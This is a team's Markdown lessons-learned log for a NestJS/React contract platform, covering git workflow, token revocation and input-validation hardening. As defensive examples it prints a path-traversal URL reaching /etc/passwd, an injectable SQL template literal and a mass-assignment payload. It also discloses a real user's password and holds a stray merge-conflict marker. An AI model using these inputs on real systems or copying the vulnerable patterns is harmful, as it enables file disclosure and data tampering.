Make `git log HEAD..origin/main --oneline` a muscle-memory habit before every `gh pr create`.

---

## 50. gitignored Files Are Invisible to Rebrand Sweeps

**Problem:**
`docker-compose.override.yml` is gitignored (local-only). The MANAGEX rebrand correctly renamed all committed files, but the override still had `cenvox:` service references. After pulling the rebrand, `docker-compose up` failed with `service "cenvox" has neither an image nor a build context` on Ayman's machine.

**Root Cause:**
gitignored files are invisible to code review, CI, and all grep sweeps against the git tree. They have to be checked manually.

**Fix:**
After any rename touching docker-compose.yml service names:
1. Check if `docker-compose.override.yml` exists locally
2. Manually update any stale service name references in it
3. Consider adding a `docker-compose.override.yml.example` to the repo so new developers know the file must exist

**File:** `docker-compose.override.yml` (gitignored — update manually after any service rename)

**How to Avoid:**
Add "check gitignored override files" as the final step of any rename that touches docker-compose service names.

---

## 51. gh CLI — workflow Scope Required to Push CI Workflow Files

**Problem:**
Default `gh auth login` scopes (`gist`, `read:org`, `repo`) do NOT include `workflow`. Any push touching `.github/workflows/` is rejected:
> "refusing to allow an OAuth App to create or update workflow without workflow scope"

This blocked the MANAGEX rebrand force-push for over an hour across 3–4 attempts.

**Root Cause:**
GitHub silently rejects `workflow`-less pushes at the remote — git reports the push as successful but the ref is not updated. The error only appears in verbose output or when checking the remote afterward.

**Fix:**
On first-time setup, or after any re-authentication:
```
gh auth login --scopes "repo,workflow,read:org,gist" --web
```
If already logged in without the scope:
```
gh auth logout --hostname github.com
gh auth login --scopes "repo,workflow,read:org,gist" --web
```
Verify after login:
```
gh auth status | grep "Token scopes"
```
Must show `workflow`.

**File:** One-time machine setup — persists until next logout.

**How to Avoid:**
Run `gh auth status | grep "Token scopes"` before any push that touches `.github/workflows/`. If `workflow` is missing, re-auth before pushing.

---

## 52. Coordination — Open a DRAFT PR Within 24–48 Hours of Branch Creation

**Problem:**
Long-lived branches compound rebase cost non-linearly:
- `feat/legal-layer` lived 4+ days before merge → required rebasing over Phase 3.2 + MANAGEX
- `claude/quirky-khorana-1d5fcc` lived 3+ days → required rebasing over Phase 3.2

A branch 10 days old can take 10× longer to rebase than a branch 1 day old.

**Root Cause:**
No convention around when to open PRs. Developers treated "open PR" as the last step, not the first.

**Fix:**
Open a DRAFT PR the same day you create a branch. This:
1. Makes the work visible to teammates immediately
2. Allows early feedback before it hardens
3. Creates pressure to finish and merge quickly
4. Means CI runs early — issues found before they compound

When ready: convert to "Ready for review," request merge.

**File:** Team convention — applies to every developer.

**How to Avoid:**
`gh pr create --draft` on day 1. Never let a branch exist for more than 48 hours without a PR.

---

## 53. Post-Merge — Always Verify Phase 3.2 Artifacts Survived

**Problem:**
Every merge during the May 2026 coordination period carried a real risk that Phase 3.2 security work would be silently dropped if conflict resolution was done incorrectly. The MANAGEX rebase specifically dropped `sanitize.ts`, all `@MaxLength`, and `@Transform` decorators — caught only because of a deliberate 5-check post-merge verification.

**Root Cause:**
Conflict resolution on CLAUDE.md / lessons.md / App.tsx favored "their side" without checking whether "our side" contained critical backend security changes.

**Fix:**
Run the 5-check verification after EVERY merge that touches backend code, CLAUDE.md, or lessons.md:
```
ls backend/src/common/utils/sanitize.ts
grep "sanitize-html" backend/package.json
grep "@MaxLength" backend/src/modules/clauses/dto/create-clause.dto.ts
grep "@Transform" backend/src/modules/clauses/dto/create-clause.dto.ts
grep "is_internal_note" backend/src/modules/support/support.service.ts
```
All 5 must return matches. If ANY fails, the merge dropped Phase 3.2 security work — do not proceed.

**File:** Post-merge checklist — permanent fixture for any backend-touching merge.

**How to Avoid:**
Treat these 5 checks as non-negotiable. Add them to the Pre-PR checklist in CLAUDE.md (done — May 2026).

---

## 76. DB Family Revocation Does Not Invalidate Live Access Tokens

**Problem:**
Phase 4.2 shipped with `revokeFamily()` that correctly marked all session
rows as revoked in the database. However, `JwtStrategy` only checks the
Redis blacklist — it does NOT query the database on every request (that
would be too slow). Result: when a token reuse attack was detected and the
family was "revoked," the attacker's already-issued access tokens kept
passing `JwtStrategy` validation for up to 15 minutes (the full access
token TTL) because their JTIs were never added to Redis.

**Root cause:**
Two separate revocation systems exist:
- **DB revocation**: prevents new refresh operations (checked by `refreshToken()`)
- **Redis blacklist**: invalidates live access tokens (checked by `JwtStrategy` on every request)

`revokeFamily()` only handled the DB side. The Redis side was missing.

**Fix:**
Before calling `revokeFamily()`, the reuse-detection path now:
1. Calls `listByFamily(familyId)` to fetch all session rows in the family
2. Blacklists each session's `jti` in Redis with TTL = remaining access
   token lifetime (computed via `parseExpiryToSeconds(JWT_ACCESS_EXPIRES_IN)`)
3. Only then calls `revokeFamily()` to mark DB rows as revoked

Both systems must be updated atomically on family revocation.

**Files fixed:**
- `session.service.ts`: added `listByFamily()`
- `auth.service.ts`: added `parseExpiryToSeconds()` + fixed reuse-detection block

**Commits:** `501d48f` (bug fix) + `ef13a1e` (CI fix — see lesson #77)

**Rule:**
Whenever you add a new revocation path, ask: *"Does this also invalidate
live access tokens in Redis?"* DB changes alone are never sufficient —
Redis is the runtime gate, the DB is the persistence layer. For family
revocation the order is always: blacklist JTIs → revoke DB rows.

---

## 77. Stale Service Mocks Break CI When New Methods Are Added

**Problem:**
Adding `listByFamily()` to `SessionService` caused CI to fail on the
next run. `token-security.spec.ts` had a hand-written `mockSessionService`
object created when Phase 4.2 was first implemented — before
`listByFamily()` existed. When `auth.service.ts` called `listByFamily()`
in the reuse-detection path, Jest threw:

```
TypeError: this.sessions.listByFamily is not a function
```

This caused a CI failure that required a separate hotfix commit (`ef13a1e`)
— an entire extra CI cycle that could have been avoided.

**Root cause:**
Hand-written mocks in NestJS specs list methods explicitly. They don't
automatically pick up new methods added to the real service. The gap
between the real service and its mock is invisible at author time — it
only surfaces when the new code path is exercised in tests.

**Fix:**
Added `listByFamily: jest.fn(async (familyId: string) => sessions.filter(s => s.family_id === familyId))` to `mockSessionService` in `token-security.spec.ts`.

**Rule:**
When you add a method to ANY service that has mocks in spec files,
immediately grep for every mock of that service:

```bash
grep -rn "mockSessionService\|SessionService.*useValue\|provide.*SessionService" \
  backend/src --include="*.spec.ts"
```

Add the new method to every mock found. Do this **in the same commit** as
the service change — never in a follow-up. A `jest.fn().mockResolvedValue([])`
stub is enough if the specific test doesn't need real behavior.

**Alternative:** Use `jest.createMockFromModule()` or `@golevelup/ts-jest`'s
`createMock<ServiceType>()` which auto-mocks all methods. Eliminates the
staleness problem entirely.

---

## 78. Multiple DTOs With the Same Name — Always Trace the Actual Endpoint

**Problem:**
Three separate `ChangePasswordDto` classes exist in different modules (`auth`, `admin-security`, `users`). We edited `auth/dto/change-password.dto.ts` but the frontend calls the `admin-security` DTO via `POST /me/change-password`. The fix had no effect — weak passwords still accepted.

**Root Cause:**
Assumed the filename `change-password.dto.ts` in the auth module was the one the frontend used. Never traced the actual frontend service call (`meService.changePassword()`) → API route → controller → DTO import path. The three DTOs are:
- `auth/dto/change-password.dto.ts` → `PATCH /auth/change-password`
- `admin-security/dto/admin-security.dto.ts::ChangePasswordDto` → `POST /me/change-password` ← **frontend uses this one**
- `users/dto/change-password.dto.ts` → `PUT /users/me/password`

**Fix:**
Traced `meService.ts` → `POST /me/change-password` → `profile.controller.ts` → `admin-security.dto.ts::ChangePasswordDto`. Fixed all three DTOs + the `security_policies` DB row.

**How to Avoid:**
- Always trace from frontend service call → API route → controller → DTO import before editing any DTO
- Never assume by filename alone — grep the import chain
- When a fix "doesn't work", first check if you edited a dead code path by tracing the actual call stack
- If the same logical concept (change-password) has multiple DTO files, grep the entire codebase for all of them before editing any one

---

## 79. Never Test Destructive Endpoints With Real User Credentials on a Live Database

**Problem:**
During curl validation testing of the `POST /me/change-password` endpoint, TEST 4 (the "valid password accepted" test) used the actual authenticated user's token against the real running database. It silently changed the user's password. The user then could not log in because their password was now `M/ohamed12345` (the test value), not what they expected.

**Root Cause:**
The test was designed to confirm that a valid password IS accepted (to prove the happy path works). That confirmation required a real write to the database. No safeguard existed between "this call returns 200" and "this call changes production data."

**Fix:**
Had to identify the new password from the curl response, then verify it via login. The `security_policies` Redis cache also needed flushing when login rate limiting kicked in from the test attempts.

**How to Avoid:**
- Before running any curl/API test against a destructive endpoint (change-password, delete, update-email, deactivate-account), document EXACTLY what side effect it will have on the live DB
- Use a dedicated throwaway test user (`test-api@sign.com`) for any manual API testing — never the real admin account
- For "confirm it accepts valid input" tests: instead of actually changing the password, verify by checking the response structure or by using a test account whose password you don't care about
- If you must test live: reset the changed value immediately as the next step in the same test script — never leave a test-mutated state in the DB

---

## 80. Password Validation Audit Must Cover ALL DTOs With a Password Field

**Problem:**
When hardening password validation to min-12 + complexity regex, we audited only the three `ChangePasswordDto` files. We missed `accept-invitation.dto.ts` which also accepts a password field. The backend allowed 8-char passwords on invitation acceptance while every other flow enforced 12.

**Root Cause:**
Searched for "ChangePasswordDto" and "change-password" but never searched for ALL DTOs containing a password field. The invitation flow sets a password for a brand-new user — it is effectively a registration, not a password change. The audit scope was too narrow.

**Fix:**
Updated `accept-invitation.dto.ts` to match `RegisterDto` exactly: `@MinLength(12)` + same `.{12,}` complexity regex + updated error message to include "at least 12 characters".

**How to Avoid:**
- When changing password rules, grep for ALL password fields across every DTO:
  `grep -rn "password" backend/src --include="*.dto.ts"`
- Any DTO with a `password` / `new_password` field must enforce the same rules as `RegisterDto`
- The complete list as of 2026-05-20 — all must stay in sync:
  - `auth/dto/register.dto.ts`
  - `auth/dto/reset-password.dto.ts`
  - `auth/dto/accept-invitation.dto.ts`
  - `auth/dto/change-password.dto.ts`
  - `admin-security/dto/admin-security.dto.ts` (`ChangePasswordDto`)
  - `users/dto/change-password.dto.ts`
- Frontend pages must also be checked: `RegisterPage`, `ResetPasswordPage`, `AcceptInvitationPage`, `MySecurityPage`

---

## 📝 Template for New Lessons

```
## N. Category — Short Description

**Problem:**
- What symptom did you see?
- What was the error message?

**Root Cause:**
- Why did it happen?
- What was the underlying issue?

**Fix:**
- What exact change fixed it?
- Code snippet if applicable

**File:** which file(s) were changed

**How to Avoid:**
- How to detect this early next time
- What to check first when this symptom appears
```

---

*Last updated: 2026-05-16*
*Feed this file to Claude at the start of every new session*

---

## Legal & Policy Layer Implementation — May 2025

**Context:** Full implementation of the SIGN Platform legal and compliance layer across 5 commits on `feat/legal-layer`. Covered: 10 policy documents, 11 new public routes, cookie consent, T&C acceptance, DB migration, AI disclaimers, communications preferences, and Word Add-In disclosures.

### Lesson 1 — Always Fast-Forward Before Committing to a Shared Branch

**What happened:** When the legal-docs commit was pushed to `main`, local `main` was 3 commits behind `origin/main`. The push would have been rejected if changes had been committed first.

**Fix:** Always run `git pull origin <branch>` or `git fetch && git merge` before committing when working on a shared branch with a colleague.

**Rule:** Before any commit+push sequence on a shared branch, run:

```bash
git fetch origin
git status
git pull origin HEAD
```

### Lesson 2 — Feature Branches Are Non-Negotiable for Large Changes

**What happened:** The initial prompt scripted direct commits to `main` for a 25-file, 2-endpoint, 1-migration change. Claude Code correctly flagged this as risky before executing.

**Fix:** Used `feat/legal-layer` feature branch instead. All 5 commits landed there. PR opened for colleague review before merge to main.

**Rule:** Any change touching more than 5 files, any DB migration, or any NestJS endpoint addition must go on a feature branch and through a PR. Never commit directly to `main` for changes of this scope.

### Lesson 3 — class-validator Does Not Ship @IsTrue — Use @Equals(true)

**What happened:** The `RegisterDto` implementation required a validator that ensures `agreed_to_terms` must be boolean `true` (not just truthy). The prompt specified `@IsTrue()` but `class-validator` does not export that decorator.

**Fix:** Used `@Equals(true)` instead, which produces identical server-side behavior and is the canonical class-validator equivalent.

**Rule:** When validating that a boolean field must be `true` (e.g. consent checkboxes), use:

```typescript
@IsBoolean()
@Equals(true, { message: 'You must accept the Terms and Conditions' })
agreed_to_terms: boolean;
```

Do not use `@IsTrue()` — it does not exist in `class-validator`.

### Lesson 4 — TypeORM Migration Timestamps Must Be Unique and Current

**What happened:** The `AddConsentColumns` migration needed a timestamp prefix in its filename (e.g. `1746950000001-AddConsentColumns.ts`). Using a stale or duplicate timestamp causes TypeORM to misorder migrations or skip them.

**Fix:** Always use the actual current Unix millisecond timestamp when naming a new migration file. Do not copy a timestamp from an existing migration.

**Rule:** Generate migration filenames with:

```bash
date +%s%3N
```

Use that output as the prefix: `{timestamp}-MigrationName.ts`.

### Lesson 5 — Public Routes Must Be Declared Before ProtectedRoute in App.tsx

**What happened:** All 11 `/legal/*` routes needed to be accessible without authentication. If placed inside the `ProtectedRoute` wrapper, unauthenticated users (including Google crawlers, guest signers, and users reading the T&C before registering) would be redirected to `/auth/login`.

**Fix:** All `/legal/*` routes were added BEFORE the `ProtectedRoute` wrapper in `App.tsx`.

**Rule:** In React Router DOM v6 with a `ProtectedRoute` pattern, any route that must be publicly accessible (legal pages, landing, auth pages) must be declared outside and before the `ProtectedRoute` element in the Routes tree. Structure:

```tsx
<Routes>
  <Route path="/" element={<LandingPage />} />          {/* public */}
  <Route path="/legal" element={<LegalHubPage />} />    {/* public */}
  <Route path="/legal/*" element={<.../>} />            {/* public */}
  <Route path="/auth/*" element={<.../>} />             {/* public */}
  <Route element={<ProtectedRoute />}>                  {/* auth required */}
    <Route path="/app/*" element={<.../>} />
  </Route>
</Routes>
```

### Lesson 6 — Cookie Consent State Belongs in localStorage, Not Redux

**What happened:** Cookie consent state needs to persist across sessions and be accessible before the React app fully hydrates (to prevent flash of unconsented analytics loading). Redux state is lost on page refresh.

**Fix:** Cookie consent is stored in `localStorage` under the key `'sign_cookie_consent'` as a JSON object with `status`, `timestamp`, `version`, and `categories`. A `CookieConsentContext` wraps the app to share the `openPreferences()` function without prop drilling.

**Rule:** Any state that must survive page refresh AND must be readable before React hydration (consent flags, language preference, theme) belongs in `localStorage`, not Redux. Use a context to expose the setter.

### Lesson 7 — Office Add-In Links Cannot Use Regular Anchor Tags

**What happened:** The Word Add-In (`apps/word-addin/`) runs inside Microsoft Office's sandboxed webview. Regular `<a href="...">` tags either do nothing or throw security errors when pointing to external URLs.

**Fix:** All external links in the Add-In use:

```typescript
Office.context.ui.openBrowserWindow('https://www.sign.io/legal/terms')
```

Wrapped in a `<span onClick={...}>` element styled to look like a link.

**Rule:** Never use `<a href>` for external navigation inside any Office Add-In component. Always use `Office.context.ui.openBrowserWindow(url)`. This applies to all tabs: LoginTab, RiskTab, SummaryTab, LibraryTab, UploadTab, ChatTab.

### Lesson 8 — Sidebar Navigation Is Emoji-Driven, Not Lucide-React

**What happened:** The implementation prompt specified adding a Communications entry to the Sidebar with a lucide-react `Bell` icon, matching the pattern used in other platform components. But the `clientNavItems` array in `App.tsx` uses emoji strings as icons, not React components.

**Fix:** Added the Communications sidebar entry using the 📣 emoji to match the existing convention rather than rewriting the sidebar schema.

**Rule:** Before adding any navigation item to `Sidebar.tsx`, check the schema of the existing nav items array. The SIGN sidebar uses emoji strings `{ label, path, icon: string }` — not lucide-react components. If the sidebar is ever refactored to use lucide-react, update all entries at once.

### Lesson 9 — DB Columns for Compliance Flags Need API Surface Immediately

**What happened:** The `email_digest_opt_out` column was added in a previous migration (Phase 3.4 compliance) but had no API endpoint to read or update it. It could only be changed via direct SQL. This meant the feature existed in the DB but was completely inaccessible to users for months.

**Fix:** In this session, `PATCH /me/communication-preferences` was added to expose `email_digest_opt_out` alongside the new `marketing_email_opt_in` and `ai_training_opt_in` columns. All three are now settable via the `CommunicationPreferencesPage`.

**Rule:** Every time a new boolean preference or flag column is added to the `users` table, the corresponding API endpoint (GET + PATCH) and UI toggle must be shipped in the same PR. Never ship a DB column without its API surface.

### Lesson 10 — Legal Pages Need a Standalone Layout With No Sidebar

**What happened:** Legal pages (`/legal/*`) are public-facing and must be accessible without authentication. They also need a different visual structure from the authenticated app (no sidebar, no app topbar, different header with breadcrumb back to `/legal`).

**Fix:** Created `LegalPageLayout.tsx` as a standalone layout component used exclusively by all `/legal/*` pages. It has its own header, sticky ToC sidebar, content area, and footer — completely independent of `AppLayout` and `AdminLayout`.

**Rule:** When adding public-facing pages to a platform that has an authenticated layout, always create a separate standalone layout component. Do not try to conditionally hide the sidebar/topbar in the existing `AppLayout` — that approach creates visual flicker and couples public pages to auth state.

### Lesson 11 — AI Output Components Must Always Show Disclaimer Labels

**What happened:** The SIGN platform's AI features (contract risk analysis, compliance checking, Q&A chat) produced outputs with no indication that the content was AI-generated or that it was not legal advice. This creates both regulatory risk and user misunderstanding.

**Fix:** Created a reusable `AIDisclaimer` component added to the top-level rendering parent of each AI output: ContractDetailPage (Risk tab), ComplianceTab, and ChatPanel.

**Rule:** Every component that renders AI-generated output must include `<AIDisclaimer />` immediately below the output. The `compact={true}` prop is for inline use within tight layouts. The full version is for dedicated output panels. Never remove or make the disclaimer conditional on user preference — it is a transparency obligation, not a feature.

### Lesson 12 — T&C Acceptance Requires Both Frontend and Backend Enforcement

**What happened:** The registration flow had no T&C acceptance at all. Adding it required changes in three places: the frontend checkbox + disabled button state, the `RegisterDto` validation, and the `auth.service` timestamp recording.

**Fix:** All three layers implemented in the same commit:
- **Frontend:** `agreedToTerms` state, `disabled={!agreedToTerms}` on submit button
- **DTO:** `@Equals(true)` validation on `agreed_to_terms`
- **Service:** `accepted_terms_at = new Date()` set server-side on registration

**Rule:** Consent acceptance must be enforced at all three layers. Frontend disabling is UX — a user can bypass it with DevTools. DTO validation is the real enforcement. Server-side timestamp recording is the legal evidence. All three must ship together.

### Lesson 13 — Settlement Agreement Acknowledgment Deferred — Track It

**What happened:** The legal layer required a mandatory acknowledgment checkbox before executing a settlement agreement through the Claims module. The settlement execution modal does not yet exist in the codebase.

**Status:** DEFERRED. The persistent claims disclaimer banner shipped. The settlement acknowledgment checkbox will be added when the settlement execution modal is built.

**Backlog item:** When building the Claims settlement execution modal, add a mandatory checkbox above the confirm button:

```tsx
<label className="flex items-start gap-3 cursor-pointer">
  <input
    type="checkbox"
    checked={settlementAcknowledged}
    onChange={(e) => setSettlementAcknowledged(e.target.checked)}
    className="mt-0.5 accent-amber-600"
  />
  <span className="text-sm text-amber-800">
    I understand that executing this settlement agreement has legal
    consequences. I have obtained independent legal advice or
    waive my right to do so. This action cannot be undone.
  </span>
</label>
```

Disable the confirm button while `settlementAcknowledged` is false.

### Lesson 14 — Verify Columns After Every Migration, Not Just After Running It

**What happened:** The migration ran successfully but we still ran `\d users` separately to confirm all 8 columns were actually present. This caught an important distinction — a successful migration log does not guarantee the columns are there if the migration file had errors.

**Fix:** After every migration, always run the column verification step:

```bash
docker-compose exec postgres psql -U sign_user -d sign_db -c "\d users"
```

And visually confirm each expected column appears in the output.

**Rule:** Migration success message ≠ column presence confirmed. Always verify the DB state directly after running migrations, especially for migrations that add columns depended on by new API endpoints or frontend features.

### Lesson 15 — Large Feature Branches Need Phased Commits, Not One Mega-Commit

**What happened:** The initial implementation prompt had one final commit at the end covering all 20 tasks. Claude Code correctly flagged that a single mega-commit for ~25 new files and ~15 modified files would be very difficult to review, revert, or debug.

**Fix:** Used 4 logical commit batches:
- **Commit 1:** DB layer (migration + entity + DTO + service)
- **Commit 2:** Frontend pages (legal hub + 10 policy pages + cookie banner + footer)
- **Commit 3:** Disclaimers (AI labels + claims + e-sign + billing + invite + Add-In)
- **Commit 4:** Communications (endpoint + page + sidebar)

**Rule:** For any feature branch with more than 10 file changes, plan commits by logical layer rather than by task number. Group: DB changes → API changes → Frontend pages → Frontend components → Integration/wiring. Each commit should be independently deployable and reviewable.

### Lesson 16 — Document Legal Policy Decisions in /legal-docs, Not Just in Code

**What happened:** 10 legally drafted policy documents (Terms, Privacy, Cookie, AI Policy, IP, Law Enforcement, AUP, Cancellation, Communications, BCR) were created specifically for SIGN and needed to be accessible to both the development team and legal reviewers.

**Fix:** Created `/legal-docs/` folder at project root with:
- `/policies/` — 10 DOCX files (authoritative source of truth)
- `/placement/` — Interactive HTML placement matrix
- `/prompt/` — Claude Code implementation prompt
- `README.md` — document index and usage guide
- `CLAUDE.md` updated with legal context

**Rule:** Legal documents are not code and must not live only in the frontend as TypeScript strings. Keep the authoritative DOCX versions in `/legal-docs/policies/` and treat them as source of truth. The TypeScript content files in `apps/sign/src/pages/legal/content/` are derived from these documents, not the other way around.

### Summary — Legal Layer Phase 1 Complete

- **Branch:** `feat/legal-layer` (5 commits ahead of `main`)
- **PR:** https://github.com/mohamed2ayman/signn/pull/new/feat/legal-layer
- **Verification:** 15/15 checks pass
- **TypeScript:** Clean (0 legal-layer errors)
- **Migration:** `AddConsentColumns1746950000001` executed
- **New columns:** 8 (all verified present)
- **New routes:** 11 (`/legal/*`)
- **New files:** ~25
- **Modified files:** ~15

**Remaining for Phase 2:**
- Merge `feat/legal-layer` to `main`
- Run migration on production/shared DB after merge
- Settlement agreement acknowledgment checkbox (when modal is built)
- Arabic translations for all policy content (i18n keys stubbed)
- BCR/DPA request button gated by Enterprise plan (account settings)

---

## 54. SQL Injection — TypeORM Parameterization Is Already There by Default

**Finding:**
Full audit of 28 query builder files, all migrations, all raw
query calls, and the AI backend found zero SQL injection
vulnerabilities. TypeORM's named parameter binding
(.where("col = :val", { val: input })) is used consistently
throughout the codebase.

**Implication:**
When a security audit finds nothing, that IS the result.
"Phase 3.1 complete" sometimes means "verified clean" not
"fixed X vulnerabilities." Document the audit and move on.

**What to watch for on new code:**
- Always use named parameters: .where("col = :val", { val })
- Never use template literals in query strings:
  .where(`col = '${userInput}'`) ← NEVER do this
- Never concatenate user input into query strings

---

## 55. LIKE Wildcard Leakage vs SQL Injection — Different Problems

**Problem:**
8 ILIKE search patterns used correct TypeORM named parameter
binding (no SQL injection possible) but did not escape the
PostgreSQL wildcard characters % and _ in user input.

Result: searching for "100%" matched "1000", "100abc", etc.
This is a correctness/UX bug, NOT a security vulnerability.

**Fix:**
Created backend/src/common/utils/escape-like.ts with
escapeLikeParam() helper. Applied at all 6 existing ILIKE sites.

**Pattern — always use this for ILIKE/LIKE:**
import { escapeLikeParam } from '../../common/utils/escape-like';

.andWhere('col ILIKE :search', {
  search: `%${escapeLikeParam(userInput)}%`
})

**Escape order matters:**
1. Backslash first: \ → \\
2. Percent: % → \%
3. Underscore: _ → \_

Reordering causes double-escaping bugs.

---

## 56. New ILIKE Sites Need escapeLikeParam() When Branches Merge

**Context:**
Phase 3.1 investigation found 8 ILIKE sites but only 6 were
patchable — the admin-security module containing the other 2
was on an unmerged branch at the time.

**Rule:**
When any branch adds a new LIKE/ILIKE query, it MUST apply
escapeLikeParam() before merging. The pre-PR check (ship.sh)
will not catch this automatically — it requires code review.

**Files to patch when admin-security merges:**
- admin-security/services/admin-activity-log.service.ts
- admin-security/services/security-audit-log.service.ts

---

## 57. Mass Assignment via Partial<Entity> — Never Use Entities as DTOs

**Context:**
compliance-obligations.controller.ts used `@Body() body: Partial<Obligation>`
with `Object.assign(entity, body)`. The Obligation entity exposes ALL database
columns including id, contract_id, created_at, and relation fields. An attacker
could send `{ "id": "other-uuid", "contract_id": "other-contract" }` and
overwrite protected fields directly.

**Root cause:**
Using the entity class directly as a DTO is a classic mass assignment
vulnerability. TypeORM entities are database mirrors — they expose everything.
DTOs are input contracts — they expose only what the endpoint should accept.

**Fix:**
Created `UpdateObligationInlineDto` with only `status` and `completed_at`.
The controller now only receives and applies those two fields.

**Rule:**
Never use `Partial<SomeEntity>` as a `@Body()` type. Always create a dedicated
DTO class with only the fields the endpoint should accept. If the entity has 20
fields and the endpoint should update 2, the DTO has 2 fields.

---

## 58. Plain TypeScript Interfaces Get Zero Validation from class-validator

**Context:**
`ObligationFilters` was a plain TypeScript interface used as
`@Query() filters: ObligationFilters`. class-validator decorators
(like @IsEnum, @IsDateString) only work on class instances — they have no
effect on plain interfaces. Result: the status field accepted any string,
causing raw PostgreSQL errors when an invalid enum value reached TypeORM.

**Root cause:**
TypeScript interfaces exist only at compile time. At runtime, they are plain
objects with no metadata. class-validator's ValidationPipe uses reflect-metadata
to read decorators — which only exist on class instances.

**Fix:**
Converted `ObligationFilters` interface to `ObligationFiltersDto` class with
`@IsOptional() @IsEnum(ObligationStatus)` on status, `@IsDateString()` on
from/to, and `@IsString()` on string fields.

**Rule:**
Never use a plain interface for `@Query()` or `@Body()` parameters that need
validation. Always use a class with class-validator decorators. If you see
`interface XxxFilters` being used in `@Query()` or `@Body()`, it needs to be
converted to a class.

---

## 59. Every Inline @Body() Object Is a Validation Gap

**Context:**
Found 6 endpoints using inline `@Body()` objects instead of DTOs:
- `@Body() body: { clauses: { id: string; order_index: number }[] }`
- `@Body() body: { status: ComplianceFindingStatus }`
- `@Body() body: { level: string }`
- `@Body() body: { clause_ids: string[] }`
- `@Body() body: { party_first_name?: string; party_second_name?: string }`
- `@Body() body: { change_summary: string }`

None of these get validated by the global ValidationPipe. The pipe only
validates class instances with decorators. An inline `{ field: type }` object
is structurally typed at compile time only — at runtime it is unvalidated.

**Consequences found:**
- No UUID validation on IDs → raw PostgreSQL errors
- No array size limits → unbounded DB operations
- No enum validation → service receives invalid values
- No MaxLength → unbounded strings saved to DB

**Fix:**
Created a proper DTO class for each endpoint. Applied `@IsUUID`,
`@ArrayMaxSize`, `@IsEnum`, `@MaxLength` as needed.

**Rule:**
Every `@Body()` and `@Query()` parameter MUST be a class with class-validator
decorators. Never use inline object types. Code review checklist: grep for
`"@Body() [a-z]"` and verify every match is a DTO class, not an inline type.

---

## 60. multer memoryStorage Has No Size Limit by Default

**Problem:**
All 5 upload endpoints used `FileInterceptor('field')` with no options. multer's default is no file size limit. The entire uploaded file is buffered to Node.js heap before any application code runs. A 1GB upload exhausts server memory before the handler even executes.

**The trap:**
Service-level size checks (like `chat-attachment.validator.ts`'s 10MB check) run AFTER the file is already fully in memory. They prevent the file from being saved, but the memory damage is already done.

**Fix:**
Always pass limits to FileInterceptor:
```typescript
FileInterceptor('file', { limits: { fileSize: 50 * 1024 * 1024 } })
```
This causes multer to reject the upload mid-stream before the full file reaches memory.

**Also:** Handle the resulting MulterError in your exception filter — otherwise `LIMIT_FILE_SIZE` surfaces as a 500 instead of a clean 413 Payload Too Large.

---

## 61. Path Traversal in File Serving — Always Contain Paths

**Problem:**
`storage.service.ts` computed file paths by stripping a URL prefix and joining with the upload directory:
```typescript
const relativePath = fileUrl.replace(baseUrl + '/uploads/', '');
const filePath = path.join(uploadDir, relativePath);
```
If `fileUrl` contained `../` sequences after the prefix (e.g. `http://localhost:3000/uploads/../../../etc/passwd`), `path.join()` would resolve to `/etc/passwd` — outside the upload directory entirely.

**The subtle fix detail:**
A naive `startsWith('/app/uploads')` check is bypassable: `/app/uploads-evil` starts with `/app/uploads` — false positive!

The correct check appends `path.sep` to the base:
```typescript
filePath.startsWith(path.resolve(uploadDir) + path.sep)
```
This ensures only paths INSIDE the directory pass.

**Fix applied to:**
- `storage.service.ts`: `assertContained()` at getFilePath, getFileBuffer, deleteFile
- `compliance.controller.ts`: `path.resolve` + `startsWith` before `res.sendFile()`

**Rule:**
Any time you compute a file path from a URL, database value, or user input, ALWAYS verify the resolved path starts with the expected directory + `path.sep` before reading, writing, or serving.

---

## 62. Optional Chaining on Methods That Return Objects

**Problem:**
`organizations.service.ts` had:
```typescript
const fileUrl = await this.storageService.uploadFile?.(file) ?? file.originalname;
```
Two bugs:
1. `uploadFile()` returns `StorageResult` (object), not a string. Storing the whole object as `file_url` saved `[object Object]`.
2. The `??` fallback stored raw `file.originalname` as a URL — a latent path injection risk.

**Root cause:**
Optional chaining (`?.`) suppresses TypeScript errors if the method doesn't exist, masking the type mismatch. The object was stored without complaint.

**Fix:**
```typescript
const uploaded = await this.storageService.uploadFile(file as any, 'policies');
if (!uploaded) throw new InternalServerErrorException('File upload failed');
file_url: uploaded.file_url  // explicit field access
```

**Rule:**
Never use optional chaining on a method call whose return value you immediately use as a primitive. The `?.` suppresses type errors AND runtime errors simultaneously. If the method might not exist, handle that explicitly with a proper guard and type-safe field access.

---

<<<<<<< HEAD
## 63. IP Extraction Must Use a Single Shared Utility

**Context:**
Phase 4.1 found IP-extraction logic duplicated in 3 places — the auth
controller (`ctxOf()`), the admin-security IP filter middleware
(`extractIp()`), and the audit-log interceptor. Two of the three parsed
`X-Forwarded-For` consistently; the third just used
`req.headers['x-forwarded-for']` verbatim (never splitting the
comma-separated list). Any future trust-proxy or fallback change would
have to be made in all three.

**Fix:**
Created `backend/src/common/utils/get-client-ip.util.ts` exporting a single
`getClientIp(source: ExecutionContext | Request)` helper. Order: first XFF
entry → `req.ip` (honors `trust proxy`) → `socket.remoteAddress` → `'0.0.0.0'`
fallback so it never returns null. Replaced the 3 duplicates with calls to it.

**Rule:**
Always use `getClientIp()` when reading the client IP in guards, middleware,
interceptors, controllers, or throttler `getTracker` callbacks. Never
re-implement XFF parsing. The utility is the only place that gets to change
when the proxy topology changes.

---

## 64. `app.set('trust proxy', ...)` Must Be Set Before Any IP-Based Middleware

**Context:**
Phase 4.1 introduced rate limiting keyed on client IP. Without
`app.set('trust proxy', 1)` in `main.ts`, Express does **not** honor the
`X-Forwarded-For` header behind a reverse proxy — `req.ip` returns the
proxy's IP instead. In production (Render/Vercel/nginx) every request would
have looked like it came from the same IP, making rate limiting useless and
the existing IP-filter middleware unable to block real attackers.

**Fix:**
Added `app.set('trust proxy', 1)` to `main.ts` before `helmet()` and before
any IP-based middleware mounts. Also typed the Nest app as
`NestExpressApplication` so `.set()` is on the type. `1` trusts exactly one
hop — the reverse proxy — and refuses to trust chained XFF values.

**Rule:**
`app.set('trust proxy', 1)` must run before helmet, before rate limiting,
before any IP-based middleware or guard. Without it, every IP-based
security control is silently broken in production.

---

## 65. Auth Error Messages Must Never Distinguish Between Failure Reasons

**Context:**
The Phase 4.1 audit found `/auth/verify-mfa` and `/auth/verify-recovery`
returned different `UnauthorizedException` messages for "unknown email" vs
"wrong code" vs "expired OTP". An attacker could call those endpoints with
a candidate email and infer from the error string whether the email had an
account at all — full user enumeration without needing valid credentials.

**Fix:**
